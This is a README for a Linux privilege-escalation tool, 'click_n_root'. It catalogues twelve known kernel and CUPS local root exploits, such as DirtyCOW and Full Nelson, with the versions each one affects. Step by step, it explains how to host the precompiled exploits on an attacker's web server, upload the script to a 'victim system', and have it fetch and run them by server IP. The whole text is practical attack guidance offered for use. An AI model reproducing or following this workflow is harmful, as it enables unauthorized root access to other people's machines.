# click_n_root - Linux Local Root Exploiter  
This is a small script to make the local exploitation process easier. It downloads the precompiled exploit for x86 and x64 architectures and can also automatic compile local on the victim system

## Exploit-List:

1.  DirtyCOW AddUser 		(Ubuntu <4.4/<3.13; Debian <4.7.8)
2.  DirtyCOW Pokeball 		(Linux Kernel 2.6.22 < 3.9)
3.  Mempodipper 		(Linux 2.6.39<3.2.2 Gentoo/Debian)
4.  Full Nelson 		(Linux 2.6.31<2.6.37 RedHat/Debiab)
5.  Half Nelson 		(Linux Kernel 2.6.0<2.6.36.2)
6.  Clown NewUser		(Linux 3.0<3.3.5)
7.  fasync_helper 		(Linux Kernel <2.6.28)
8.  overlayfs 			(Linux 3.13.0<3.19)
9.  pipe.c root(kit?) 		(Kernel 2.6.x (32 Bit only!))
10. PERF_EVENTS 		(Kernel 2.6.32-3.8.10)
11. CAN BCM Exploit 		(Kernel <2.6.36)
12. Cups local Exploit 	(Cups <1.1.17)

## How to use it:

1. Copy the content of the zip to your web-root (default: /var/www)
2. Now your web-root directory should have this structur: eg. /var/www/click_n_root/
  1. The folders 1, 2,... etc contain several pre-compiled Exploits
3. Upload the click_n_root.sh -Script to the target linux machine
4. Give executable rights to the click_n_root -Script (chmod 755 KlickAndRoot.sh)
5. Execute the script with given Server and Folder and choose an option/exploit
  1. E.g.: ./click_n_root 192.168.0.200/click_n_root

### Feel free to modify the script to your needs.

Cheers!
